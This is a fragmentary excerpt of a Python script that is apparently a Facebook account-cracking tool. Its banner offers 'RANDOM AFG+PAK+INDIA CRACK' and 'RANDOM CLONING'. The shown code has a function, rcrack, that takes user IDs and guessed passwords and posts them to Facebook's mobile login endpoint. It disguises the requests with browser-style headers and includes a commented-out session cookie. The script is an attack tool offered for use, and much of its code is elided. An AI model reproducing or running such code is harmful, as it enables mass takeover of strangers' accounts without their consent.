...
def o():
    os.system('clear')
    print(logo)
    print('\t RANDOM AFG+PAK+INDIA CRACK')
    print('')
    print('\x1b[1;32m [1]\x1b[1;33m RANDOM CLONING+3')
...
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1.2
\033[1;37m===============================================
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=vHcHZYJsFowJwq2_wLJ4sn1n; sb=vHcHZaSIfSeidnc4s4Zg2afq; m_pixel_ratio=3; wd=360x728; fr=08fxF6aICEai0NKvI..BlB3e8.ht.AAA.0.0.BlC0fR.AWWyV3tgxYA',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5740.209", "Google Chrome";v="114.0.5740.209"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': pro}      
            lo = session.post('https://p.facebook.com/login.php',data=log_data,headers=header_freefb).text,
